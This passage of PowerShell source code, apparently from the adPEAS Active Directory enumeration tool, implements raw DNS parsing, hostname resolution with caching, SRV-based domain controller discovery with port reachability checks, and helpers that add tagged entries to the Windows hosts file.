            # TYPE (2 bytes)
            $recordType = ($response[$offset] -shl 8) -bor $response[$offset + 1]
            $offset += 2

            # CLASS (2 bytes) - skip
            $offset += 2

            # TTL (4 bytes) - skip
            $offset += 4

            # RDLENGTH (2 bytes)
            $rdlength = ($response[$offset] -shl 8) -bor $response[$offset + 1]
            $offset += 2

            # Check for A record (type 1) with 4 bytes of data
            if ($Type -eq 'A' -and $recordType -eq 1 -and $rdlength -eq 4 -and $offset + 4 -le $response.Length) {
                $ip = "$($response[$offset]).$($response[$offset + 1]).$($response[$offset + 2]).$($response[$offset + 3])"
                return $ip
            }

            # Check for SRV record (type 33)
            if ($Type -eq 'SRV' -and $recordType -eq 33 -and $rdlength -ge 7 -and $offset + $rdlength -le $response.Length) {
                # SRV RDATA: Priority (2), Weight (2), Port (2), Target (variable)
                $priority = ($response[$offset] -shl 8) -bor $response[$offset + 1]
                $weight = ($response[$offset + 2] -shl 8) -bor $response[$offset + 3]
                $port = ($response[$offset + 4] -shl 8) -bor $response[$offset + 5]

                # Read target hostname (starts at offset + 6)
                $targetResult = & $ReadDnsName $response ($offset + 6)
                $target = $targetResult.Name

                if ($target) {
                    $srvRecords.Add([PSCustomObject]@{
                        Priority = $priority
                        Weight   = $weight
                        Port     = $port
                        Target   = $target.TrimEnd('.')
                    })
                }
            }

            # Skip RDATA
            $offset += $rdlength
        }

        # Return results based on query type
        if ($Type -eq 'SRV' -and $srvRecords.Count -gt 0) {
            # Sort by Priority (lower = preferred), then by Weight (higher = preferred)
            $sortedRecords = @($srvRecords | Sort-Object Priority, @{Expression={-$_.Weight}})
            Write-Log "[Invoke-RawDnsQuery] Found $($srvRecords.Count) SRV record(s)"

            if ($ReturnAllSRV) {
                # Return ALL records sorted by priority/weight
                return $sortedRecords
            }
            else {
                # Return only the best record (legacy behavior)
                $bestRecord = $sortedRecords[0]
                Write-Log "[Invoke-RawDnsQuery] Returning best SRV: $($bestRecord.Target):$($bestRecord.Port) (Priority: $($bestRecord.Priority))"
                return $bestRecord
            }
        }

        Write-Log "[Invoke-RawDnsQuery] No $Type record found in response"
        return $null
    }
    catch {
        Write-Log "[Invoke-RawDnsQuery] Error: $_"
        return $null
    }
    finally {
        if ($udpClient) {
            $udpClient.Close()
        }
    }
}

function Resolve-HostnameToIP {
    <#
    .SYNOPSIS
        Resolves a hostname to an IP address. Internal helper function.
    .NOTES
        Internal use only.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Hostname,

        [Parameter(Mandatory = $false)]
        [string]$DnsServer,

        [Parameter(Mandatory = $false)]
        [switch]$NoCache
    )

    # Check if input is already an IP address
    $ipAddress = $null
    if ([System.Net.IPAddress]::TryParse($Hostname, [ref]$ipAddress)) {
        Write-Log "[Resolve-HostnameToIP] Input is already an IP address: $Hostname"
        return $Hostname
    }

    # Initialize DNS cache if not exists
    if ($Script:LDAPContext -and -not $Script:LDAPContext['DnsCache']) {
        $Script:LDAPContext['DnsCache'] = [System.Collections.Generic.Dictionary[string,string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    }

    # Check cache first (unless NoCache specified)
    if (-not $NoCache -and $Script:LDAPContext -and $Script:LDAPContext['DnsCache'] -and $Script:LDAPContext['DnsCache'].ContainsKey($Hostname)) {
        $cachedIP = $Script:LDAPContext['DnsCache'][$Hostname]
        Write-Log "[Resolve-HostnameToIP] Cache hit for $Hostname : $cachedIP"
        return $cachedIP
    }

    # Try custom DNS server if specified
    if ($DnsServer) {
        Write-Log "[Resolve-HostnameToIP] Resolving $Hostname using custom DNS: $DnsServer"

        # Method 1: Resolve-DnsName cmdlet (Windows 8+ / Server 2012+)
        try {
            $DnsResult = Resolve-DnsName -Name $Hostname -Server $DnsServer -Type A -DnsOnly -ErrorAction Stop

            if ($DnsResult -and $DnsResult.IPAddress) {
                $ResolvedIP = ($DnsResult | Where-Object { $_.Type -eq 'A' } | Select-Object -First 1).IPAddress

                if ($ResolvedIP) {
                    Write-Log "[Resolve-HostnameToIP] Resolved $Hostname to $ResolvedIP via Resolve-DnsName"

                    # Cache the result
                    if ($Script:LDAPContext -and $Script:LDAPContext['DnsCache']) {
                        $Script:LDAPContext['DnsCache'][$Hostname] = $ResolvedIP
                    }

                    return $ResolvedIP
                }
            }
        }
        catch [System.Management.Automation.CommandNotFoundException] {
            Write-Log "[Resolve-HostnameToIP] Resolve-DnsName cmdlet not available, trying UDP fallback"
        }
        catch {
            Write-Log "[Resolve-HostnameToIP] Resolve-DnsName failed: $_"
        }

        # Method 2: Raw UDP DNS query (fallback)
        try {
            $UdpResult = Invoke-RawDnsQuery -Name $Hostname -DnsServer $DnsServer -Type A

            if ($UdpResult) {
                Write-Log "[Resolve-HostnameToIP] Resolved $Hostname to $UdpResult via UDP DNS"

                # Cache the result
                if ($Script:LDAPContext -and $Script:LDAPContext['DnsCache']) {
                    $Script:LDAPContext['DnsCache'][$Hostname] = $UdpResult
                }

                return $UdpResult
            }
        }
        catch {
            Write-Log "[Resolve-HostnameToIP] UDP DNS query failed: $_"
        }
    }

    # Fallback: System DNS
    Write-Log "[Resolve-HostnameToIP] Resolving $Hostname using system DNS"

    try {
        $DnsResult = [System.Net.Dns]::GetHostEntry($Hostname)

        if ($DnsResult -and $DnsResult.AddressList.Count -gt 0) {
            # Prefer IPv4 address, fallback to IPv6
            $ResolvedAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1

            if (-not $ResolvedAddr) {
                $ResolvedAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetworkV6' } | Select-Object -First 1
            }

            if ($ResolvedAddr) {
                $ResolvedIP = $ResolvedAddr.IPAddressToString
                Write-Log "[Resolve-HostnameToIP] Resolved $Hostname to $ResolvedIP via system DNS"

                # Cache the result
                if ($Script:LDAPContext -and $Script:LDAPContext['DnsCache']) {
                    $Script:LDAPContext['DnsCache'][$Hostname] = $ResolvedIP
                }

                return $ResolvedIP
            }
        }
    }
    catch {
        Write-Log "[Resolve-HostnameToIP] System DNS resolution failed: $_"
    }

    # Resolution failed
    Write-Log "[Resolve-HostnameToIP] Failed to resolve $Hostname"
    return $null
}

function Test-DCReachable {
    <#
    .SYNOPSIS
        Tests if a Domain Controller is reachable by checking critical ports. Internal helper function.
    .DESCRIPTION
        Performs TCP connection tests to verify DC availability.
        Tests Port 88 (Kerberos KDC) first as it's the most reliable DC indicator,
        then Port 389 (LDAP) or Port 636 (LDAPS).
    .PARAMETER IP
        The IP address to test.
    .PARAMETER Hostname
        Optional hostname (for logging purposes).
    .PARAMETER TimeoutMs
        Connection timeout in milliseconds. Default: 1000 (1 second).
    .PARAMETER UseLDAPS
        If set, tests Port 636 instead of Port 389.
    .OUTPUTS
        $true if DC is reachable, $false otherwise.
    .NOTES
        Internal use only.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$IP,

        [Parameter(Mandatory = $false)]
        [string]$Hostname,

        [Parameter(Mandatory = $false)]
        [int]$TimeoutMs = 1000,

        [Parameter(Mandatory = $false)]
        [switch]$UseLDAPS
    )

    $DisplayName = if ($Hostname) { "$Hostname ($IP)" } else { $IP }
    $LdapPort = if ($UseLDAPS) { 636 } else { 389 }

    # Helper function to test a single port with proper resource cleanup
    $TestPort = {
        param([string]$TargetIP, [int]$Port, [int]$Timeout)

        $client = $null
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $client.BeginConnect($TargetIP, $Port, $null, $null)
            $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne($Timeout, $false)

            if ($waitSuccess) {
                # Must call EndConnect to complete the async operation (prevents resource leaks)
                try {
                    $client.EndConnect($asyncResult)
                    return $client.Connected
                }
                catch {
                    # EndConnect throws if connection failed
                    return $false
                }
            }
            else {
                # Timeout - connection did not complete in time
                return $false
            }
        }
        catch {
            return $false
        }
        finally {
            # Guaranteed cleanup
            if ($client) {
                try { $client.Close() } catch { }
                try { $client.Dispose() } catch { }
            }
        }
    }

    # Test Port 88 (Kerberos KDC) - best indicator of a real DC
    $kerberosReachable = & $TestPort $IP 88 $TimeoutMs

    if ($kerberosReachable) {
        Write-Log "[Test-DCReachable] $DisplayName - Port 88 (Kerberos) OK"

        # Also verify LDAP port is open
        $ldapReachable = & $TestPort $IP $LdapPort $TimeoutMs

        if ($ldapReachable) {
            Write-Log "[Test-DCReachable] $DisplayName - Port $LdapPort (LDAP) OK - DC is reachable"
            return $true
        }
        else {
            Write-Log "[Test-DCReachable] $DisplayName - Port $LdapPort (LDAP) FAILED"
            return $false
        }
    }
    else {
        Write-Log "[Test-DCReachable] $DisplayName - Port 88 (Kerberos) FAILED - not a reachable DC"
        return $false
    }
}

function Resolve-SrvRecord {
    <#
    .SYNOPSIS
        Resolves DNS SRV records. Internal helper function.
    .PARAMETER Name
        The SRV record name to query.
    .PARAMETER DnsServer
        Optional custom DNS server.
    .PARAMETER ReturnAll
        If set, returns ALL SRV records sorted by Priority/Weight.
        Otherwise returns only the first (best) record.
    .OUTPUTS
        Single PSCustomObject or array of PSCustomObjects with Target, Port, Priority, Weight.
    .NOTES
        Internal use only.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $false)]
        [string]$DnsServer,

        [Parameter(Mandatory = $false)]
        [switch]$ReturnAll
    )

    $AllRecords = [System.Collections.Generic.List[PSCustomObject]]::new()

    # Try custom DNS server if specified
    if ($DnsServer) {
        Write-Log "[Resolve-SrvRecord] Resolving SRV $Name using custom DNS: $DnsServer"

        # Method 1: Resolve-DnsName cmdlet
        try {
            $DnsResult = Resolve-DnsName -Name $Name -Server $DnsServer -Type SRV -DnsOnly -ErrorAction Stop

            # Safely check if we got valid SRV records
            # $DnsResult can be $null, a single object, or an array
            if ($null -ne $DnsResult) {
                # Filter for SRV records that have a NameTarget property
                $SrvRecordsFound = @($DnsResult | Where-Object { $null -ne $_.NameTarget })

                if ($SrvRecordsFound.Count -gt 0) {
                    # Sort by Priority (lower = better), then by Weight (higher = better)
                    $SortedRecords = $SrvRecordsFound | Sort-Object Priority, @{Expression={-$_.Weight}}

                    foreach ($rec in $SortedRecords) {
                        $AllRecords.Add([PSCustomObject]@{
                            Target = $rec.NameTarget.TrimEnd('.')
                            Port = $rec.Port
                            Priority = $rec.Priority
                            Weight = $rec.Weight
                        })
                    }

                    if ($AllRecords.Count -gt 0) {
                        Write-Log "[Resolve-SrvRecord] Found $($AllRecords.Count) SRV record(s) via Resolve-DnsName"
                        if ($ReturnAll) { return $AllRecords.ToArray() }
                        return $AllRecords[0]
                    }
                }
            }
        }
        catch [System.Management.Automation.CommandNotFoundException] {
            Write-Log "[Resolve-SrvRecord] Resolve-DnsName cmdlet not available, trying UDP fallback"
        }
        catch {
            Write-Log "[Resolve-SrvRecord] Resolve-DnsName failed: $_"
        }

        # Method 2: Raw UDP DNS query (fallback)
        if ($AllRecords.Count -eq 0) {
            try {
                $UdpResult = Invoke-RawDnsQuery -Name $Name -DnsServer $DnsServer -Type SRV -ReturnAllSRV:$ReturnAll

                if ($UdpResult) {
                    # Handle both single record and array results
                    if ($UdpResult -is [System.Array]) {
                        Write-Log "[Resolve-SrvRecord] Found $($UdpResult.Count) SRV record(s) via UDP DNS"
                        foreach ($rec in $UdpResult) {
                            $AllRecords.Add($rec)
                        }
                        if ($ReturnAll) { return $AllRecords.ToArray() }
                        return $AllRecords[0]
                    }
                    elseif ($UdpResult.Target) {
                        Write-Log "[Resolve-SrvRecord] Found SRV: $($UdpResult.Target):$($UdpResult.Port) via UDP DNS"
                        return $UdpResult
                    }
                }
            }
            catch {
                Write-Log "[Resolve-SrvRecord] UDP DNS query failed: $_"
            }
        }
    }

    # Fallback: System DNS
    if ($AllRecords.Count -eq 0) {
        Write-Log "[Resolve-SrvRecord] Resolving SRV $Name using system DNS"

        # Method 1: Resolve-DnsName without custom server
        try {
            $DnsResult = Resolve-DnsName -Name $Name -Type SRV -DnsOnly -ErrorAction Stop

            # Safely check if we got valid SRV records
            # $DnsResult can be $null, a single object, or an array
            if ($null -ne $DnsResult) {
                # Filter for SRV records that have a NameTarget property
                $SrvRecordsFound = @($DnsResult | Where-Object { $null -ne $_.NameTarget })

                if ($SrvRecordsFound.Count -gt 0) {
                    $SortedRecords = $SrvRecordsFound | Sort-Object Priority, @{Expression={-$_.Weight}}

                    foreach ($rec in $SortedRecords) {
                        $AllRecords.Add([PSCustomObject]@{
                            Target = $rec.NameTarget.TrimEnd('.')
                            Port = $rec.Port
                            Priority = $rec.Priority
                            Weight = $rec.Weight
                        })
                    }

                    if ($AllRecords.Count -gt 0) {
                        Write-Log "[Resolve-SrvRecord] Found $($AllRecords.Count) SRV record(s) via system DNS"
                        if ($ReturnAll) { return $AllRecords.ToArray() }
                        return $AllRecords[0]
                    }
                }
            }
        }
        catch [System.Management.Automation.CommandNotFoundException] {
            Write-Log "[Resolve-SrvRecord] Resolve-DnsName not available for system SRV lookup"
        }
        catch {
            Write-Log "[Resolve-SrvRecord] System DNS SRV lookup failed: $_"
        }
    }

    # Method 2: UDP fallback via system DNS server
    if ($AllRecords.Count -eq 0) {
        try {
            # Try Get-CimInstance first (PowerShell 3.0+), fall back to Get-WmiObject (deprecated but works on older systems)
            $SystemDnsServer = $null
            try {
                $NetworkConfig = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -ErrorAction Stop |
                    Where-Object { $_.DNSServerSearchOrder } | Select-Object -First 1
                if ($NetworkConfig) { $SystemDnsServer = $NetworkConfig.DNSServerSearchOrder[0] }
            }
            catch {
                # Fallback to Get-WmiObject for older systems
                $NetworkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue |
                    Where-Object { $_.DNSServerSearchOrder } | Select-Object -First 1
                if ($NetworkConfig) { $SystemDnsServer = $NetworkConfig.DNSServerSearchOrder[0] }
            }

            if ($SystemDnsServer) {
                Write-Log "[Resolve-SrvRecord] Trying UDP SRV query via system DNS: $SystemDnsServer"
                $UdpResult = Invoke-RawDnsQuery -Name $Name -DnsServer $SystemDnsServer -Type SRV -ReturnAllSRV:$ReturnAll

                if ($UdpResult) {
                    # Handle both single record and array results
                    if ($UdpResult -is [System.Array]) {
                        Write-Log "[Resolve-SrvRecord] Found $($UdpResult.Count) SRV record(s) via UDP system DNS"
                        if ($ReturnAll) { return $UdpResult }
                        return $UdpResult[0]
                    }
                    elseif ($UdpResult.Target) {
                        Write-Log "[Resolve-SrvRecord] Found SRV: $($UdpResult.Target):$($UdpResult.Port) via UDP system DNS"
                        return $UdpResult
                    }
                }
            }
        }
        catch {
            Write-Log "[Resolve-SrvRecord] UDP system DNS SRV query failed: $_"
        }
    }

    Write-Log "[Resolve-SrvRecord] Failed to resolve SRV record: $Name"
    return $null
}

#endregion Helper Functions

#region Main Function

function Resolve-adPEASName {
    [CmdletBinding(DefaultParameterSetName = 'Name')]
    param(
        [Parameter(Mandatory = $true, ParameterSetName = 'Name')]
        [string]$Name,

        [Parameter(Mandatory = $true, ParameterSetName = 'Domain')]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [ValidateScript({
            if ([string]::IsNullOrEmpty($_)) { return $true }
            $ip = $null
            if ([System.Net.IPAddress]::TryParse($_, [ref]$ip)) { return $true }
            throw "DnsServer must be an IP address, not a hostname: $_"
        })]
        [string]$DnsServer,

        [Parameter(Mandatory = $false)]
        [switch]$NoCache,

        [Parameter(Mandatory = $false)]
        [switch]$UseLDAPS
    )

    process {
        # Determine effective DNS server (parameter or from LDAPContext)
        $EffectiveDnsServer = $DnsServer
        if (-not $EffectiveDnsServer -and $Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
            $EffectiveDnsServer = $Script:LDAPContext['DnsServer']
        }

        # Determine if LDAPS should be used for reachability tests
        $EffectiveUseLDAPS = $UseLDAPS
        if (-not $EffectiveUseLDAPS -and $Script:LDAPContext -and $Script:LDAPContext['UseLDAPS']) {
            $EffectiveUseLDAPS = $true
        }

        # Hostname to IP Resolution (-Name parameter)
        if ($PSCmdlet.ParameterSetName -eq 'Name') {
            return Resolve-HostnameToIP -Hostname $Name -DnsServer $EffectiveDnsServer -NoCache:$NoCache
        }

        # Domain Controller Discovery (-Domain parameter)
        $SrvRecordName = "_ldap._tcp.dc._msdcs.$Domain"
        Write-Log "[Resolve-adPEASName] Querying SRV records: $SrvRecordName"

        $SrvResults = Resolve-SrvRecord -Name $SrvRecordName -DnsServer $EffectiveDnsServer -ReturnAll
        if ($SrvResults) {
            if ($SrvResults -isnot [System.Array]) {
                $SrvResults = @($SrvResults)
            }
            Write-Log "[Resolve-adPEASName] Found $($SrvResults.Count) DC(s) via SRV records"

            # Iterate through DCs in priority order, test reachability
            foreach ($SrvRecord in $SrvResults) {
                $DcHostname = $SrvRecord.Target
                Write-Log "[Resolve-adPEASName] Trying DC: $DcHostname (Priority: $($SrvRecord.Priority), Weight: $($SrvRecord.Weight))"

                # Resolve DC hostname to IP
                $DcIP = Resolve-HostnameToIP -Hostname $DcHostname -DnsServer $EffectiveDnsServer -NoCache:$NoCache

                if (-not $DcIP) {
                    Write-Log "[Resolve-adPEASName] Could not resolve $DcHostname to IP, trying next DC"
                    continue
                }

                # Test if DC is actually reachable (Port 88 + 389/636)
                if (Test-DCReachable -IP $DcIP -Hostname $DcHostname -UseLDAPS:$EffectiveUseLDAPS) {
                    Write-Log "[Resolve-adPEASName] DC $DcHostname ($DcIP) is reachable - using this DC"
                    return [PSCustomObject]@{
                        Hostname = $DcHostname
                        IP = $DcIP
                    }
                }
                else {
                    Write-Log "[Resolve-adPEASName] DC $DcHostname ($DcIP) is NOT reachable (stale SRV record?), trying next DC"
                }
            }

            Write-Log "[Resolve-adPEASName] All $($SrvResults.Count) DC(s) from SRV records are unreachable"
        }

        # Fallback: Reverse DNS lookup (system DNS only)
        if (-not $EffectiveDnsServer) {
            Write-Log "[Resolve-adPEASName] Attempting reverse DNS lookup for: $Domain"
            try {
                $DnsResult = [System.Net.Dns]::GetHostEntry($Domain)
                if ($DnsResult -and $DnsResult.AddressList.Count -gt 0) {
                    # Prefer IPv4 address, fallback to IPv6
                    $DcIPAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
                    if (-not $DcIPAddr) {
                        $DcIPAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetworkV6' } | Select-Object -First 1
                    }
                    if (-not $DcIPAddr -and $DnsResult.AddressList.Count -gt 0) {
                        $DcIPAddr = $DnsResult.AddressList[0]
                    }

                    if ($DcIPAddr) {
                        $DcIPString = $DcIPAddr.IPAddressToString
                        Write-Log "[Resolve-adPEASName] Domain resolved to IP: $DcIPString"

                        # Try reverse lookup to get actual DC hostname
                        $DcHostname = $Domain  # Default to domain name if reverse lookup fails
                        try {
                            $ReverseResult = [System.Net.Dns]::GetHostEntry($DcIPAddr)
                            if ($ReverseResult -and $ReverseResult.HostName -and $ReverseResult.HostName -ne $Domain) {
                                $DcHostname = $ReverseResult.HostName
                                Write-Log "[Resolve-adPEASName] Reverse DNS resolved: $DcHostname"
                            }
                        }
                        catch {
                            Write-Log "[Resolve-adPEASName] Reverse DNS lookup failed, using domain name as hostname: $_"
                        }

                        if (Test-DCReachable -IP $DcIPString -Hostname $DcHostname -UseLDAPS:$EffectiveUseLDAPS) {
                            Write-Log "[Resolve-adPEASName] DC $DcHostname ($DcIPString) via reverse DNS is reachable"
                            return [PSCustomObject]@{
                                Hostname = $DcHostname
                                IP = $DcIPString
                            }
                        }
                        else {
                            Write-Log "[Resolve-adPEASName] DC $DcHostname ($DcIPString) via reverse DNS is NOT reachable"
                        }
                    }
                }
            }
            catch {
                Write-Log "[Resolve-adPEASName] System DNS resolution failed: $_"
            }
        }

        # Last resort: Direct A record lookup for domain name
        Write-Log "[Resolve-adPEASName] Falling back to direct domain resolution"
        $DomainIP = Resolve-HostnameToIP -Hostname $Domain -DnsServer $EffectiveDnsServer -NoCache:$NoCache

        if ($DomainIP) {
            if (Test-DCReachable -IP $DomainIP -Hostname $Domain -UseLDAPS:$EffectiveUseLDAPS) {
                Write-Log "[Resolve-adPEASName] DC $Domain ($DomainIP) via direct resolution is reachable"
                return [PSCustomObject]@{
                    Hostname = $Domain
                    IP = $DomainIP
                }
            }
            else {
                Write-Log "[Resolve-adPEASName] DC $Domain ($DomainIP) via direct resolution is NOT reachable"
            }
        }

        # Complete failure
        Write-Log "[Resolve-adPEASName] Could not discover reachable DC for domain: $Domain"
        return $null
    }
}

#endregion Main Function



# ----- Invoke-HostsFileManagement.ps1 -----

<#
.SYNOPSIS
    Manages Windows hosts file entries for adPEAS DNS resolution.

.DESCRIPTION
    Provides functions to add and remove entries from the Windows hosts file.
    This is useful when:
    - System DNS cannot resolve target AD hostnames
    - Custom DNS server is specified but Kerberos/SMB needs system-level resolution
    - Non-domain-joined system accessing AD over VPN

    IMPORTANT: Requires Administrator privileges to modify hosts file!

    The hosts file is located at: C:\Windows\System32\drivers\etc\hosts
    Entries are marked with a comment tag for cleanup.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

# Marker comment for adPEAS hosts entries (for cleanup)
$Script:HostsFileMarker = "# adPEAS-managed entry"

# Mutex name for cross-process synchronization when modifying hosts file
# Uses Global\ prefix to work across all sessions on the system
$Script:HostsFileMutexName = "Global\adPEAS_HostsFile_Mutex"

# Default mutex timeout in milliseconds (5 seconds)
$Script:HostsFileMutexTimeoutMs = 5000

# Regex pattern for IP addresses (IPv4 and IPv6)
# IPv4: 192.168.1.1
# IPv6: ::1, fe80::1, 2001:db8::1, etc.
$Script:IPAddressPattern = '(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?::[0-9a-fA-F]{1,4}){1,6}|:(?::[0-9a-fA-F]{1,4}){1,7}|::(?:[fF]{4}:)?(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'

<#
.SYNOPSIS
    Tests if the current session has Administrator privileges.

.DESCRIPTION
    Quick check to determine if hosts file modification is possible.

.OUTPUTS
    $true if running as Administrator, $false otherwise.
#>
function Test-adPEASAdminPrivileges {
    [CmdletBinding()]
    param()

    process {
        return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
}

<#
.SYNOPSIS
    Validates a hostname format.

.DESCRIPTION
    Checks if a hostname is valid according to RFC 1123.
    Valid hostnames:
    - Contain only alphanumeric characters, hyphens, and dots
    - Each label is 1-63 characters
    - Total length is max 253 characters
    - Labels don't start or end with hyphens

.PARAMETER Hostname
    The hostname to validate.

.OUTPUTS
    $true if valid, $false otherwise.
#>
function Test-ValidHostname {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Hostname
    )

    process {
        # Check total length
        if ($Hostname.Length -gt 253 -or $Hostname.Length -eq 0) {
            return $false
        }

        # Split into labels and validate each
        $labels = $Hostname.Split('.')
        foreach ($label in $labels) {
            # Each label must be 1-63 characters
            if ($label.Length -eq 0 -or $label.Length -gt 63) {
                return $false
            }
            # Labels must not start or end with hyphen
            if ($label.StartsWith('-') -or $label.EndsWith('-')) {
                return $false
            }
            # Labels must contain only alphanumeric and hyphens
            if ($label -notmatch '^[a-zA-Z0-9-]+$') {
                return $false
            }
        }

        return $true
    }
}

<#
.SYNOPSIS
    Executes a scriptblock with hosts file locking and retry logic.

.DESCRIPTION
    Internal helper function that handles:
    - Mutex acquisition for cross-process synchronization
    - File locking with retry logic
    - Proper resource cleanup

.PARAMETER ScriptBlock
    The scriptblock to execute. Receives $fileStream as parameter.

.PARAMETER TimeoutMs
    Mutex timeout in milliseconds.

.PARAMETER ReadOnly
    If true, opens file for read-only access with shared read.

.OUTPUTS
    Returns whatever the scriptblock returns.
#>
function Invoke-WithHostsFileLock {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [scriptblock]$ScriptBlock,

        [Parameter(Mandatory=$false)]
        [int]$TimeoutMs = $Script:HostsFileMutexTimeoutMs,

        [Parameter(Mandatory=$false)]
        [switch]$ReadOnly
    )

    process {
        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
        $mutex = $null
        $mutexAcquired = $false
        $fileStream = $null

        try {
            # Create or open system-wide mutex
            $mutex = New-Object System.Threading.Mutex($false, $Script:HostsFileMutexName)

            # Wait to acquire mutex
            $mutexAcquired = $mutex.WaitOne($TimeoutMs)

            if (-not $mutexAcquired) {
                throw "Timeout waiting for hosts file lock (another instance may be modifying it)"
            }

            # Retry logic for file locking issues (other non-adPEAS processes)
            $maxRetries = 3
            $retryDelayMs = 100
            $lastException = $null

            for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
                try {
                    if ($ReadOnly) {
                        # Open for reading with shared read access
                        $fileStream = [System.IO.File]::Open(
                            $hostsPath,
                            [System.IO.FileMode]::Open,
                            [System.IO.FileAccess]::Read,
                            [System.IO.FileShare]::Read
                        )
                    }
                    else {
                        # Open with exclusive access for writing
                        $fileStream = [System.IO.File]::Open(
                            $hostsPath,
                            [System.IO.FileMode]::Open,
                            [System.IO.FileAccess]::ReadWrite,
                            [System.IO.FileShare]::None
                        )
                    }

                    # Execute the scriptblock with the filestream
                    $result = & $ScriptBlock $fileStream
                    return $result
                }
                catch [System.IO.IOException] {
                    $lastException = $_
                    # File is locked by another process, retry after delay
                    if ($attempt -lt $maxRetries) {
                        Write-Log "[Invoke-WithHostsFileLock] File locked, retry $attempt of $maxRetries in ${retryDelayMs}ms..."
                        Start-Sleep -Milliseconds $retryDelayMs
                        $retryDelayMs = $retryDelayMs * 2  # Exponential backoff
                    }
                }
                finally {
                    if ($fileStream) {
                        try { $fileStream.Dispose() } catch { }
                        $fileStream = $null
                    }
                }
            }

            # All retries exhausted
            throw "Failed to access hosts file after $maxRetries attempts (file locked): $($lastException.Exception.Message)"
        }
        finally {
            # Always release mutex
            if ($mutexAcquired -and $mutex) {
                try { $mutex.ReleaseMutex() } catch { }
            }
            if ($mutex) {
                try { $mutex.Dispose() } catch { }
            }
        }
    }
}

<#
.SYNOPSIS
    Adds an entry to the Windows hosts file.

.DESCRIPTION
    Adds a hostname-to-IP mapping to the Windows hosts file.
    Requires Administrator privileges.
    Entries are marked with a comment for later cleanup.

.PARAMETER IPAddress
    The IP address to map to (IPv4 or IPv6).

.PARAMETER Hostname
    The hostname to add (e.g., "dc01.contoso.com").

.PARAMETER Force
    Overwrite existing entry if present.

.EXAMPLE
    Add-adPEASHostsEntry -IPAddress "10.10.10.5" -Hostname "dc01.contoso.com"

.EXAMPLE
    Add-adPEASHostsEntry -IPAddress "::1" -Hostname "localhost6"

.OUTPUTS
    [PSCustomObject] with Success, Message, and RequiresElevation properties.
#>
function Add-adPEASHostsEntry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$IPAddress,

        [Parameter(Mandatory=$true)]
        [string]$Hostname,

        [Parameter(Mandatory=$false)]
        [switch]$Force
    )

    process {
        $Result = [PSCustomObject]@{
            Success = $false
            Message = ""
            RequiresElevation = $false
            Entry = ""
        }

        $entry = "$IPAddress`t$Hostname`t$Script:HostsFileMarker"

        # Validate IP address (IPv4 or IPv6)
        $ip = $null
        if (-not [System.Net.IPAddress]::TryParse($IPAddress, [ref]$ip)) {
            $Result.Message = "Invalid IP address format: $IPAddress"
            Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
            return $Result
        }

        # Validate hostname format
        if (-not (Test-ValidHostname -Hostname $Hostname)) {
            $Result.Message = "Invalid hostname format: $Hostname (must be valid RFC 1123 hostname)"
            Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
            return $Result
        }

        # Check if running as Administrator
        if (-not (Test-adPEASAdminPrivileges)) {
            $Result.RequiresElevation = $true
            $Result.Message = "Administrator privileges required to modify hosts file"
            Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
            return $Result
        }

        try {
            $Result = Invoke-WithHostsFileLock -ScriptBlock {
                param($fileStream)

                $innerResult = [PSCustomObject]@{
                    Success = $false
                    Message = ""
                    RequiresElevation = $false
                    Entry = ""
                }

                $streamReader = $null
                $streamWriter = $null

                try {
                    # Read all content
                    $streamReader = New-Object System.IO.StreamReader($fileStream, [System.Text.Encoding]::ASCII, $true, 4096, $true)
                    $fullContent = $streamReader.ReadToEnd()
                    $hostsContent = @($fullContent -split "`r?`n")

                    # Check if entry already exists (IPv4 or IPv6 pattern)
                    $escapedHostname = [regex]::Escape($Hostname)
                    $existingEntry = $hostsContent | Where-Object { $_ -match "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*" }

                    if ($existingEntry -and -not $Force) {
                        $innerResult.Message = "Entry for $Hostname already exists. Use -Force to overwrite."
                        Write-Log "[Add-adPEASHostsEntry] $($innerResult.Message)"
